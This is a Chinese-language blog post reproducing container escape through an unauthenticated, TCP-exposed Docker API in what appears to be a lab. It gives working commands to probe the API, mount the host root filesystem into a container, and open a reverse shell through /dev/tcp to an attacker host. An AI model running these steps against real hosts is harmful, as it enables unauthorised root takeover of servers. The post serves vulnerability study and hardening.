---
title: "Docker 远程 API 未授权访问导致的容器逃逸"
date: "2024-08-04 12:21:23"
updated: "2026-05-30 19:31:12"
categories: ["文章", "漏洞分析"]
tags: ["docker 逃逸"]
thumbnail: "/wp-content/uploads/2025/img-a858f67c8e3c.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "626"
---
<h2 class="md-end-block md-heading"><span class="md-plain">一、漏洞背景</span></h2>
<p class="md-end-block md-p"><span class="md-plain">Docker 守护进程（dockerd）默认通过 Unix Socket（/var/run/docker.sock）提供服务，仅允许本地访问。但如果管理员配置不当，将其通过 -H 0.0.0.0: 端口暴露在 TCP 端口上，且未做身份验证和访问控制，攻击者可远程利用 Docker API 执行命令，甚至挂载宿主机文件系统实现 “逃逸”，获取宿主机控制权。</span></p>

<h2 class="md-end-block md-heading"><span class="md-plain">二、复现步骤及原理</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">1. 暴露 Docker 守护进程 API</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">漏洞原理：Docker 守护进程若监听所有网络接口（0.0.0.0）的 TCP 端口（如 9527），会允许任意远程主机访问 Docker API，为攻击提供入口。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">复现命令（管理员操作，模拟配置不当）：</span></p>



```bash
# 同时保留本地 Unix Socket 和远程 TCP 访问
dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:9527
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">作用：Docker 守护进程既通过 unix:///var/run/docker.sock 支持本地访问，又通过 0.0.0.0:9527 允许远程 TCP 访问。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2. 未授权访问 Docker API</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">复现命令（攻击者操作，验证 API 暴露）：</span></p>



```bash
# 向目标 IP 的 9527 端口发送请求，验证 API 是否可访问
wget http://192.168.226.154:9527
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行效果：</span></p>
<p class="md-end-block md-p"></p>

<img class="alignnone size-full wp-image-627" src="/wp-content/uploads/2025/img-a858f67c8e3c.png" alt="" width="441" height="121" /></li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">结果说明：若返回 404 Not Found 但显示 “已连接”，说明端口开放且 API 可访问（Docker API 未配置根路径路由，正常返回 404）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">进一步操作：攻击者可执行 Docker 命令查看所有容器：</span></p>



```bash
docker -H tcp://192.168.226.154:9527 ps -a
```


</li>
</ul>
<p class="md-end-block md-p"></p>
<img class="alignnone size-full wp-image-628" src="/wp-content/uploads/2025/img-6786e246f9e5.png" alt="" width="1173" height="316" />
<h3 class="md-end-block md-heading"><span class="md-plain">3. 挂载宿主机文件系统到容器</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">复现命令（攻击者操作）：</span></p>
</li>
</ul>


```bash
# 远程启动 Ubuntu 容器，挂载宿主机根目录到容器 /mnt
docker -H tcp://192.168.226.154:9527 run -it --rm -v /:/mnt ubuntu:18.04 /bin/bash
```


<h3 class="md-end-block md-heading"><span class="md-plain">4. 容器内执行恶意命令（获取宿主机权限）</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">复现命令（攻击者操作）：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">本地监听端口（攻击者主机，等待反弹 shell）：</span></p>
</li>
</ol>


```bash
nc -Lvvp 4444 # 监听 4444 端口，接收反弹连接
```


<ol class="ol-list" start="2">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">容器内执行反弹 shell 命令（利用挂载的宿主机 bash）：</span> <span class="md-plain">在容器终端中，通过宿主机的 bash 向攻击者主机反弹 shell</span></p>



```bash
/mnt/bin/bash -i >/dev/tcp/192.168.226.133/4444 0>&1
```


<img class="alignnone size-full wp-image-629" src="/wp-content/uploads/2025/img-4bb18ae38730.png" alt="" width="719" height="29" /></li>
</ol>
<p class="md-end-block md-p"></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行效果：攻击者主机的 nc 会收到来自目标宿主机的连接，获得宿主机的 root 权限 shell（通过 id 命令可验证为 uid=0 (root)）。</span></p>
</li>
</ul>
<p class="md-end-block md-p md-focus"><img class="alignnone size-full wp-image-630" src="/wp-content/uploads/2025/img-e5db0ed9e53c.png" alt="" width="612" height="435" /></p>
